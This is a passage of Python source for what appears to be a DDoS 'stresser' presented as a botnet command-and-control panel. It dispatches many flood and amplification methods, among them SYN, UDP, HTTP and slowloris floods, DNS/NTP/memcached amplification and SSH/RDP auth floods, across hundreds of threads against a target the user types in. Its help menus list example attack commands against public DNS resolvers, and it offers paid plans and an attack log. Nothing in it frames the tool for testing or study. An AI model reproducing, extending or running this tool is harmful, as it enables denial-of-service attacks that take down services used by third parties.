        elif method in ("HTTP_GET","HTTP_HEAD","HTTP_RANGE","HTTP_REDIRECT"): w = lambda ip,port,path: self._http_worker(ip,port,path)
        elif method in ("HTTP_POST","HTTP_PUT","HTTP_DELETE","HTTP_PATCH","HTTP_OPTIONS"): w = lambda ip,port,path: self._http_methods_worker(ip,port,method)
        elif method == "HTTP_SLOW": w = self._slow_worker
        elif method == "HTTP_BYPASS": w = self._http_bypass_worker
        elif method in ("HTTP_COOKIE","HTTP_CACHE_BYPASS"): w = self._http_cookie_worker
        elif method in ("HTTPS_FLOOD","HTTPS_RENEG"): w = self._https_worker
        elif method == "WEBSOCKET": w = self._ws_worker
        elif method in ("HTTP2_FLOOD","HTTP3_FLOOD"): w = self._http2_worker
        elif method in ("FTP_AUTH","SMTP_AUTH","POP3_AUTH","IMAP_AUTH","TELNET_LOGIN","SSH_FLOOD","RDP_LOGIN"): w = lambda ip,port,_=None: self._auth_worker(ip,port,method)
        else: w = lambda ip,port,_=None: self._udp_worker(ip,port,method)
        
       
        http_list = ["HTTP_GET","HTTP_POST","HTTP_PUT","HTTP_DELETE","HTTP_PATCH","HTTP_OPTIONS","HTTP_HEAD","HTTP_RANGE","HTTP_REDIRECT"]
        
        for _ in range(min(threads, 500)):
            if method in http_list:
                t = threading.Thread(target=w, args=(ip, port, path), daemon=True)
            else:
                t = threading.Thread(target=w, args=(ip, port), daemon=True)
            t.start()




class C2:
    def __init__(self):
        self.eng = Engine()
        self.bots = {}; self.bid = 0
        self.running = True
        self.max_threads = 1
        self.c2_status = "ONLINE"
        self.plan = "FREE"
        self.add_bots(250)
        
        
        self.attack_history = []
        self.max_history = 50
        
       
        self.bot_pool_size = 250
        self.bot_pool_active = 0
    
    def cls(self): os.system('clear' if os.name=='posix' else 'cls')
    
    def banner(self):
        self.cls()
        c = T.get('p'); a = T.get('a'); s = T.get('s'); d = T.get('d')
        print(BANNER.format(p=c, a=a))
        print(f"{c}  BOTNET | C2 | API {R}")
        print(f"{c}  Made By: Lemonaidd {R}")
        status_color = T.get('s') if self.eng.running else T.get('d')
        print(f"{d}  Bots: {len(self.bots)}  |  C2: {T.get('s')}{self.c2_status}{R}{d}  |  Plan: {T.get('a')}{self.plan}{R}{d}  |  Concurrents: {T.get('i')}{self.max_threads}{R}{d}")
        print(f"{c}  {'='*55}{R}")
    
    def short_status(self):
        if self.eng.running: return f"ATTACK: {self.eng.sent:,} pkts"
        return "IDLE"
    
    def status(self):
        if self.eng.running:
            return f"{self.eng.sent:,} pkts | {self.eng.pps:,.0f} pps | {self.eng.mbps:.2f} Mbps | {self.eng.errors} errs | {self.eng.elapsed:.0f}s"
        return " "
    
    def add_bots(self, n=10):
        for i in range(n):
            self.bid += 1
            self.bots[self.bid] = {"ip":f"192.168.{random.randint(1,254)}.{random.randint(2,254)}","name":f"bot-{self.bid}","uptime":random.randint(60,86400),"status":"IDLE"}
        return n
   
    def record_attack(self, method, target, port, duration, sent, pps, mbps, errors, elapsed):
        entry = {
            "id": len(self.attack_history) + 1,
            "method": method,
            "target": target,
            "port": port,
            "duration": duration,
            "sent": sent,
            "pps": round(pps, 0),
            "errors": errors,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        self.attack_history.append(entry)
        # keep max entries
        if len(self.attack_history) > self.max_history:
            self.attack_history = self.attack_history[-self.max_history:]
    
    
    def show_history(self):
        self.banner()
        print(f"\n  {T.get('a')}ATTACK HISTORY (last {len(self.attack_history)} stored in cache){R}\n")
        if not self.attack_history:
            print(f"  {T.get('w')}No attacks recorded yet.{R}")
        else:
            print(f"  {'ID':<4} {'METHOD':<18} {'TARGET':<22} {'PKTS':<10} {'PPS':<10}  {'TIME'}")
            print(f"  {'-'*72}")
            for entry in reversed(self.attack_history[-20:]):
                print(f"  {entry['id']:<4} {entry['method']:<18} {entry['target']:<22} {entry['sent']:<10,} {entry['pps']:<10,.0f}  {entry['timestamp']}")
        input(f"\n  {T.get('d')}Press ENTER...{R}")
    
    def show_bots(self):
        self.banner()
        print(f"\n  {T.get('a')}Active Bots: {len(self.bots)}{R}\n")
        print("  {:<6s} {:<18s} {:<15s} {}".format("ID","IP","Hostname","Status"))
        print("  "+"-"*50)
        for bid, bot in list(self.bots.items())[:40]:
            sc = T.get('s') if bot["status"]=="online" else R
            print(f"  {bid:<6d} {bot['ip']:<18s} {bot['name']:<15s} {sc}{bot['status']}{R}")
        if len(self.bots) > 40: print(f"  {T.get('d')}... and {len(self.bots)-40} more{R}")
        input(f"\n  {T.get('d')}Press ENTER...{R}")
    
    def show_methods(self):
        self.banner()
        print(f"\n  {T.get('a')}LAYER 4 ({len(L4_METHODS)} methods):{R}")
        for i,m in enumerate(L4_METHODS,1): print(f"    [{i:2d}] {m}")
        print(f"\n  {T.get('a')}LAYER 7 ({len(L7_METHODS)} methods):{R}")
        for i,m in enumerate(L7_METHODS,len(L4_METHODS)+1): print(f"    [{i:2d}] {m}")
        print(f"\n  {T.get('d')}Short: udp, syn, tcp, ack, rst, fin, icmp, http, post, slow, dns, ws, https, xmas, null, smurf, dns_any, amp_ssdp{R}")
        input(f"\n  {T.get('d')}Press ENTER...{R}")
    
    def resolve(self, name):
        n = name.upper().strip()
        m = {
            "UDP":"UDP_FLOOD","SYN":"SYN_FLOOD","TCP":"TCP_FLOOD","ACK":"ACK_FLOOD",
            "RST":"RST_FLOOD","FIN":"FIN_FLOOD","PSH":"PSH_FLOOD","ICMP":"ICMP_FLOOD",
            "XMAS":"XMAS_FLOOD","NULL":"NULL_FLOOD","SMURF":"ICMP_SMURF",
            "HTTP":"HTTP_GET","GET":"HTTP_GET","POST":"HTTP_POST","PUT":"HTTP_PUT",
            "DELETE":"HTTP_DELETE","PATCH":"HTTP_PATCH","HEAD":"HTTP_HEAD","SLOW":"HTTP_SLOW",
            "DNS":"DNS_FLOOD","DNS_ANY":"DNS_ANY","DNS_TCP":"DNS_TCP","DNS_AXFR":"DNS_AXFR",
            "NTP":"NTP_MONLIST","SSDP":"SSDP_FLOOD","SNMP":"SNMP_FLOOD",
            "WS":"WEBSOCKET","HTTPS":"HTTPS_FLOOD",
            "AMP":"UDP_AMP_DNS","AMP_DNS":"UDP_AMP_DNS","AMP_NTP":"UDP_AMP_NTP",
            "AMP_SSDP":"UDP_AMP_SSDP","AMP_MEMCACHED":"UDP_AMP_MEMCACHED",
            "GRE":"GRE_FLOOD","ESP":"ESP_FLOOD","ARP":"ARP_FLOOD",
            "MEMCACHED":"MEMCACHED_FLOOD","MSSQL":"MSSQL_FLOOD","MYSQL":"MYSQL_FLOOD",
            "RDP":"RDP_FLOOD","SMB":"SMB_FLOOD","LDAP":"LDAP_FLOOD","DHCP":"DHCP_FLOOD",
            "FTP":"FTP_FLOOD","SMTP":"SMTP_FLOOD","TELNET":"TELNET_FLOOD",
        }
        return m.get(n, n if n in ALL_METHODS else None)
    
    
    def attack(self, method, target, port, duration):
        m = self.resolve(method)
        if not m:
            print(f"{T.get('e')}Unknown method{R}"); time.sleep(1); return
        
        ip, tport, path = parse_target(target)
        if port: tport = port
        
       
        if self.eng.running:
            self.eng.stop()
            time.sleep(0.3)
        
        threads = min(self.max_threads, 500)
        if m == "HTTP_SLOW": threads = min(threads, 200)
        elif m.startswith("HTTP") or m in ("HTTPS_FLOOD","HTTPS_RENEG","WEBSOCKET","HTTP2_FLOOD","HTTP3_FLOOD"): threads = min(threads, 100)
        
        self.banner()
        print(f"\n  {T.get('p')}╔══════════════════ ATTACK LAUNCHED ═══════════════════╗{R}")
        print(f"  {T.get('p')}║{R}  {T.get('a')}{m}{R} >>> {T.get('w')}{ip}:{tport}{R}")
        print(f"  {T.get('p')}║{R}  Concurrents: {T.get('i')}{threads}{R} | Duration: {T.get('i')}{duration if duration>0 else '∞'}s{R}")
        print(f"  {T.get('p')}║{R}  Target: {T.get('w')}{target}{R}")
        print(f"  {T.get('p')}╚══════════════════════════════════════════════════════╝{R}")
        print(f"\n  {T.get('w')}Type 'stop' or press ENTER to stop.{R}")
        
        self.eng.launch(m, ip, tport, threads, path)
        
        if duration > 0:
            def autostop():
                time.sleep(duration); self.eng.stop()
            threading.Thread(target=autostop, daemon=True).start()
        
        while self.eng.running:
            try:
                cmd = input(f"\n  {T.get('s')}running [{self.eng.sent:,} pkts | {self.eng.pps:,.0f} pps]{R} > ").strip().lower()
                if cmd in ("stop","s",""):
                    self.eng.stop()
                    print(f"  {T.get('w')}Attack stopped.{R}"); break
                elif cmd == "status":
                    print(f"  {T.get('a')}Packets: {self.eng.sent:,}{R}")
                    print(f"  {T.get('a')}Rate: {self.eng.pps:,.0f} pps{R}")
                    print(f"  {T.get('a')}Bandwidth: {self.eng.mbps:.2f} Mbps{R}")
                    print(f"  {T.get('a')}Errors: {self.eng.errors}{R}")
                    print(f"  {T.get('a')}Elapsed: {self.eng.elapsed:.1f}s{R}")
            except: break
        
       
        self.record_attack(m, f"{ip}:{tport}", tport, duration, self.eng.sent, self.eng.pps, self.eng.mbps, self.eng.errors, self.eng.elapsed)
        
        print(f"\n  {T.get('s')}═══ ATTACK SUMMARY ═══{R}")
        print(f"  {T.get('a')}Total Packets:{R} {self.eng.sent:,}")
        print(f"  {T.get('a')}Avg Rate:{R} {self.eng.pps:,.0f} pps")
        print(f"  {T.get('a')}Avg Bandwidth:{R} {self.eng.mbps:.2f} API Mb")
        print(f"  {T.get('a')}Errors:{R} {self.eng.errors}")
        print(f"  {T.get('a')}Duration:{R} {self.eng.elapsed:.1f}s")
        print(f"  {T.get('a')}Logged:{R} attack #{len(self.attack_history)}")
        time.sleep(4)
    
    def interactive(self):
        self.banner()
        print(f"\n  {T.get('w')}{R}\n")
        target = input(f"  {T.get('a')}Target (IP/domain/URL) >{R} ").strip()
        if not target: return
        p = input(f"  {T.get('a')}Port (0=auto) >{R} ").strip()
        port = int(p) if p and p.isdigit() else 0
        d = input(f"  {T.get('a')}Duration (sec, 0=unlimited) >{R} ").strip()
        duration = int(d) if d and d.isdigit() else 60
        
        self.banner()
        print(f"\n  {T.get('w')}SELECT METHOD{R}\n")
        print(f"  {T.get('a')}L4 ({len(L4_METHODS)} methods):{R}")
        for i,m in enumerate(L4_METHODS,1): print(f"    [{i:2d}] {m}")
        print(f"\n  {T.get('a')}L7 ({len(L7_METHODS)} methods):{R}")
        for i,m in enumerate(L7_METHODS,len(L4_METHODS)+1): print(f"    [{i:2d}] {m}")
        print(f"\n  {T.get('d')}Or type: udp, syn, tcp, ack, rst, fin, icmp, http, post, slow, dns, ws, https, xmas, null, smurf, amp_dns{R}")
        
        mi = input(f"\n  {T.get('s')}method >{R} ").strip()
        if not mi: return
        method = None
        try:
            idx = int(mi)-1
            if 0 <= idx < len(ALL_METHODS): method = ALL_METHODS[idx]
        except: method = self.resolve(mi)
        if not method: print(f"{T.get('e')}Invalid{R}"); time.sleep(1); return
        self.attack(method, target, port, duration)
    
    def settings(self):
        while True:
            self.banner()
            print(f"\n  {T.get('w')}SETTINGS{R}\n")
            print(f"  [1] Theme        {T.get('a')}[{T.current.upper()}]{R}")
            print(f"  [2] Max Concurrents  {T.get('a')}[{self.max_threads}]{R}")
            print(f"  [4] Plan         {T.get('a')}[{self.plan}]{R}")
            print(f"  [5] Clear Attack log  {T.get('a')}[{len(self.attack_history)} entries]{R}")
            print(f"  [B] Back\n")
            c = input(f"  {T.get('s')}> {R}").strip().lower()
            if c == "1":
                self.banner(); print(f"\n  {T.get('w')}SELECT THEME{R}\n")
                for i,t in enumerate(T.list(),1):
                    marker = "►" if T.current == t else " "
                    print(f"    [{i}] {marker} {t.upper()}")
                tc = input(f"\n  {T.get('s')}theme >{R} ").strip()
                try: idx = int(tc)-1; T.set(T.list()[idx])
                except: pass
            elif c == "2":
                print(f"\n  {T.get('d')}Current: {self.max_threads} (max 500){R}")
                tc = input(f"  {T.get('a')}New max conc >{R} ").strip()
                if tc and tc.isdigit(): self.max_threads = min(max(int(tc),1),500); print(f"  {T.get('s')}Set{R}"); time.sleep(1)
            elif c == "3":
                print(f"\n  {T.get('d')}Current: {self.c2_status}{R}")
                tc = input(f"  {T.get('a')}New status >{R} ").strip()
                if tc: self.c2_status = tc.upper(); print(f"  {T.get('s')}Set{R}"); time.sleep(1)
            elif c == "4":
                plans = ["FREE","BASIC","PREMIUM","ENTERPRISE","LIFETIME"]
                self.banner(); print(f"\n  {T.get('w')}SELECT PLAN{R}\n")
                for i,p in enumerate(plans,1):
                    marker = "►" if self.plan == p else " "
                    print(f"    [{i}] {marker} {p}")
                pc = input(f"\n  {T.get('s')}plan >{R} ").strip()
                try: idx = int(pc)-1; self.plan = plans[idx]
                except: pass
            elif c == "5":
                self.attack_history = []
                print(f"  {T.get('s')} cache cleared.{R}"); time.sleep(1)
            elif c in ("b","back"): break
    
    def menu(self):
        self.banner()
        print(f"""
  {T.get('p')}╔══════════════════════════════════════╗{R}
  {T.get('p')}║{R}  {T.get('w')}[A]{R} Launch Attack                   {T.get('p')}║{R}
  {T.get('p')}║{R}  {T.get('w')}[B]{R} Bots ({len(self.bots)})                     {T.get('p')} ║{R}
  {T.get('p')}║{R}  {T.get('w')}[M]{R} Methods ({len(ALL_METHODS)})                   {T.get('p')} ║{R}
  {T.get('p')}║{R}  {T.get('w')}[L]{R} Attack Log ({len(self.attack_history)})                 {T.get('p')} ║{R}
  {T.get('p')}║{R}  {T.get('w')}[S]{R} Settings                        {T.get('p')}║{R}
  {T.get('p')}║{R}  {T.get('w')}[H]{R} Help                            {T.get('p')}║{R}
  {T.get('p')}║{R}  {T.get('w')}[Q]{R} Quit                            {T.get('p')}║{R}
  {T.get('p')}╚═══════════════════════════════════════════════╝{R}
""")
        print(f"  {T.get('d')}{self.status()}{R}")
        return input(f"\n  {T.get('s')}c2>{R} ").strip()
    
    def run(self):
        self.cls(); self.banner()
        print(f" {T.get('s')}BOTNET | C2 | API {R}")
        print(f" {T.get('d')}{len(self.bots)} bots : CONNECTED. ")
        print(f" {T.get('d')} {len(self.attack_history)}/{self.max_history} C2: CONNECTED.{R}")
        time.sleep(1.9)
        
        
        while self.running:
            cmd = self.menu()
            if not cmd: continue
            
            if cmd.startswith("!"):
                parts = cmd[1:].strip().split()
                base = parts[0].lower()
                if base == "stop": self.eng.stop(); print(f"  {T.get('w')}Stopped{R}"); time.sleep(1)
                elif base in ("addbots","add"): print(f"  {T.get('d')}Bots fixed at {len(self.bots)}{R}"); time.sleep(1)
                elif base == "bots": self.show_bots()
                elif base in ("methods","method"): self.show_methods()
                elif base == "history": self.show_history()
                elif base in ("status","stats"): 
                    print(f"  {self.status()}"); 
                    if self.attack_history:
                        print(f"  {T.get('d')}Last attack: #{self.attack_history[-1]['id']} - {self.attack_history[-1]['method']} @ {self.attack_history[-1]['target']} ({self.attack_history[-1]['timestamp']}){R}")
                    input(f"  {T.get('d')}Press ENTER...{R}")
                elif base == "theme":
                    self.banner(); print(f"\n  {T.get('w')}THEMES{R}\n")
                    for i,t in enumerate(T.list(),1):
                        marker = "►" if T.current == t else " "
                        print(f"    [{i}] {marker} {t.upper()}")
                    tc = input(f"\n  {T.get('s')}theme >{R} ").strip()
                    try: idx = int(tc)-1; T.set(T.list()[idx])
                    except: pass
                elif base in ("help","h"):
                    self.banner()
                    print(f"""
  {T.get('w')}COMMANDS:{R}
  {T.get('s')}!method target port duration{R}
    {T.get('a')}!udp 1.1.1.1 80 60{R}
    {T.get('a')}!syn 192.168.1.1 443 120{R}
    {T.get('a')}!xmas 10.0.0.1 80 60{R}
    {T.get('a')}!http https://site.com 30{R}
    {T.get('a')}!dns 8.8.8.8 53 300{R}
    {T.get('a')}!amp_dns 1.1.1.1 53 90{R}
    {T.get('a')}!post https://api.example.com 120{R}
    {T.get('a')}!slow 192.168.1.1 80 300{R}
  {T.get('s')}!stop{R}       - Stop attack
  {T.get('s')}!theme{R}      - Change theme
  {T.get('s')}!history{R}    - View attack history 
  {T.get('s')}!status{R}     - Show status
  {T.get('s')}!exit{R}       - Exit
  
  {T.get('w')}FEATURES:{R}
  {T.get('d')}• Cool and powerful Methods{R}
  {T.get('d')}• Attack history  ({self.max_history} entries){R}
  {T.get('d')}• C2 Attack Structure  {R}
  {T.get('d')}• {len(self.bots)} + bots/proxies in network{R}
""")
                    input(f"  {T.get('d')}Press ENTER...{R}")
                elif base in ("exit","quit"): self.running = False
                else:
                    method = parts[0]
                    target = parts[1] if len(parts)>=2 else ""
                    port = 0; duration = 30
                    if len(parts)>=3:
                        try: port = int(parts[2])
                        except:
                            try: duration = int(parts[2])
                            except: pass
                    if len(parts)>=4:
                        try: duration = int(parts[3])
                        except: pass
                    if not target: print(f"  {T.get('w')}Usage: !method target [port] [duration]{R}"); time.sleep(1)
                    else: self.attack(method, target, port, duration)
            
            elif cmd.upper() == "A": self.interactive()
            elif cmd.upper() == "B": self.show_bots()
            elif cmd.upper() == "M": self.show_methods()
            elif cmd.upper() == "L": self.show_history()
            elif cmd.upper() == "S": self.settings()
            elif cmd.upper() in ("H","HELP"):
                self.banner()
                print(f"""
  {T.get('w')}MENU OPTIONS:{R}
  {T.get('w')}[A]{R} Attack - Launch an attack 
  {T.get('w')}[B]{R} Bots   - View bot network ({len(self.bots)} bots)
  {T.get('w')}[M]{R} Methods - View all {len(ALL_METHODS)} attack methods
  {T.get('w')}[L]{R} Attack Log - View attack history 
  {T.get('w')}[S]{R} Settings - Theme, concurrency, status, plan
  {T.get('w')}[?]{R} Help   - This menu
  {T.get('w')}[Q]{R} Quit   - Exit
  
  {T.get('w')}Quick Attack Syntax:{R}
  {T.get('d')}!<method> <target> [port] [duration]{R}
  
  {T.get('w')}Examples:{R}
  {T.get('d')}!udp 1.1.1.1 80 60{R}
  {T.get('d')}!syn 10.0.0.5 443 120{R}
  {T.get('d')}!http https://example.com 30{R}
  
  {T.get('w')}Notes:{R}
  {T.get('d')}• NO ATTACKING: .gov , .edu , .mil , (sweden,russia,canada)   {R}
  {T.get('d')}• Attack with cuation ! you are not invisible.  {R}
  {T.get('d')}• Join TG or follow on TT for updates and uptimes. {R}
""")
                input(f"  {T.get('d')}Press ENTER...{R}")
            elif cmd.upper() == "Q": self.running = False
        
        self.eng.stop()
        print(f"\n  {T.get('s')}Goodbye..{R}\n")




if __name__ == "__main__":
    try:
        c2 = C2()
        c2.run()
    except KeyboardInterrupt:
        print(f"\n  {T.get('w')}Exiting...{R}")
    except Exception as e:
        print(f"\n  {T.get('e')}Error: {e}{R}")
        import traceback; traceback.print_exc()